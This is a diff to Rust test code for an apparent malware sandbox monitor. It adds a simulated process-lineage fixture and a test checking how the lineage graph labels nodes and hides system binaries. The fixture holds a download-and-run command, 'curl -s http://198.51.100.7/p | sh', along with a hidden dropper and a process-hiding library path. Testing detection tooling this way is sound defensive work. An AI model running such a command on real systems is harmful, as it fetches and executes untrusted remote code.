@@ -109,8 +109,10 @@ pub(super) fn save_run(
 /// a technique and a VM check, a YARA hit and two indicators.
 pub(super) fn save_digest(run: &RunSummary, tier: &str, hit: bool) {
     use antinomie_monitor_core::run_digest::{
-        Behaviour, BehaviourHit, DetectionHit, EvasionCheck, IndicatorEntry, RunDigest,
+        Behaviour, BehaviourHit, DetectionHit, EvasionCheck, IndicatorEntry, Lineage, LineageExec,
+        LineageFile, RunDigest,
     };
+    let sha = |n: u8| format!("{n:02x}").repeat(32);
     RunDigest::update(&run.directory, |digest| {
         digest.behaviour = Some(Behaviour {
             highest: tier.into(),
@@ -142,6 +144,60 @@ pub(super) fn save_digest(run: &RunSummary, tier: &str, hit: bool) {
             }]
         } else {
             Vec::new()
+        });
+        // install.sh runs a command through sh, starts .x (which starts
+        // itself again) and .x writes a library; curl is a base binary.
+        digest.lineage = Some(Lineage {
+            files: vec![
+                LineageFile {
+                    path: "/tmp/.x".into(),
+                    sha256: sha(2),
+                    roles: vec!["created".into(), "executed".into()],
+                    writer: "/tmp/install.sh".into(),
+                },
+                LineageFile {
+                    path: "/usr/lib/libprocesshider.so".into(),
+                    sha256: sha(3),
+                    roles: vec!["created".into()],
+                    writer: "/tmp/.x".into(),
+                },
+                LineageFile {
+                    path: "/usr/bin/curl".into(),
+                    sha256: sha(9),
+                    roles: vec!["executed".into()],
+                    writer: String::new(),
+                },
+            ],
+            execs: vec![
+                LineageExec {
+                    parent: "/tmp/install.sh".into(),
+                    path: "/bin/sh".into(),
+                    command: "curl -s http://198.51.100.7/p | sh".into(),
+                    count: 1,
+                    ..LineageExec::default()
+                },
+                LineageExec {
+                    parent: "/bin/sh".into(),
+                    path: "/usr/bin/curl".into(),
+                    sha256: sha(9),
+                    count: 1,
+                    ..LineageExec::default()
+                },
+                LineageExec {
+                    parent: "/tmp/install.sh".into(),
+                    path: "/tmp/.x".into(),
+                    sha256: sha(2),
+                    count: 1,
+                    ..LineageExec::default()
+                },
+                LineageExec {
+                    parent: "/tmp/.x".into(),
+                    path: "/tmp/.x".into(),
+                    sha256: sha(2),
+                    count: 4,
+                    ..LineageExec::default()
+                },
+            ],
         });
         digest.indicators = Some(vec![
             IndicatorEntry {
@@ -243,6 +299,15 @@ fn the_summary_adds_up_the_runs_triage_digests() {
         ),
         (2, 2, 1)
     );
+    // The lineage graph: the command and .x, one level each way by default.
+    let graph = app.samples_page.detail_lineage().unwrap();
+    let labels: Vec<&str> = graph.nodes.iter().map(|node| node.label.as_str()).collect();
+    assert!(labels.contains(&".x") && labels.contains(&"$ curl -s http://198.51.100.7/p | sh"));
+    assert!(
+        !labels.contains(&"curl"),
+        "system binaries are hidden: {labels:?}"
+    );
+    assert_eq!(graph.hidden_system, 1);
     // The page draws with the sections present.
     for _ in 0..3 {
         render(&mut app, &ctx, SIZE);
